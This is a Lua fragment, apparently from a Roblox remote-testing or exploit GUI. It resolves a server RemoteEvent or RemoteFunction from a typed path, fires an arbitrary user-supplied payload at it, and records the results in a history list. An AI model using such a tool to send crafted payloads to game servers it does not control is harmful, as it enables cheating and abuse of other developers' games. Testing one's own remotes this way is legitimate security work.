local function pushHist(name, payload, ok, res)
    local e={ts=ts(),name=name,ok=ok,result=tostring(res)}
    table.insert(S.execHistory,1,e)
    while #S.execHistory>CFG.MAX_EXEC_HISTORY do table.remove(S.execHistory) end
    HistList:ClearAllChildren(); ll(HistList,2); pad(HistList,4,4,4,4)
    for _,h in ipairs(S.execHistory) do
        local r=Instance.new("Frame"); r.Size=UDim2.new(1,-8,0,16); r.BackgroundColor3=h.ok and Color3.fromRGB(11,22,12) or Color3.fromRGB(22,11,11); r.BorderSizePixel=0; r.Parent=HistList; corner(r,3)
        local l=lbl(r,("[%s] %s → %s"):format(h.ts,h.name,h.ok and "OK: "..h.result:sub(1,50) or "FAIL: "..h.result:sub(1,50)),10,h.ok and T.OK or T.CRIT,Enum.Font.Code); l.Size=UDim2.new(1,-8,1,0); l.Position=UDim2.new(0,4,0,0)
    end
end

local function doExecute()
    local remote = S.selRemote
    local payload = PayloadBox.Text
    if payload=="" then log("WARN","Payload is empty."); return end

    if not remote or not remote.Parent then
        local path=TargetBox.Text; if path=="" then log("WARN","No target remote."); return end
        local parts=path:split(".")
        local ok2,svc=pcall(function() return game:GetService(parts[1]) end)
        if ok2 then local cur=svc; for i=2,#parts do cur=cur:FindFirstChild(parts[i]); if not cur then break end end; remote=cur end
        if not remote then log("WARN","Cannot resolve: "..path); return end
    end

    log("EXEC",("Firing [%s] %s on '%s'"):format(S.fireMode,remote.ClassName,remote.Name))

    local ok, res
    if S.fireMode=="FireServer" and remote:IsA("RemoteEvent") then
        ok,res=pcall(function() remote:FireServer(payload); return "Fired" end)
    elseif S.fireMode=="InvokeServer" and remote:IsA("RemoteFunction") then
        ok,res=pcall(function() return tostring(remote:InvokeServer(payload)) end)
    else
        log("WARN","Mode/class mismatch"); ExecResultLabel.TextColor3=T.CRIT; ExecResultLabel.Text="Mode mismatch"; return
    end
    local resultStr = ok and tostring(res) or ("ERROR: "..tostring(res))
    ExecResultLabel.Text="Last: "..resultStr:sub(1,80); ExecResultLabel.TextColor3=ok and T.OK or T.CRIT
    log(ok and "OK" or "WARN","Result: "..resultStr:sub(1,120))
    pushHist(remote.Name, payload, ok, resultStr)
end

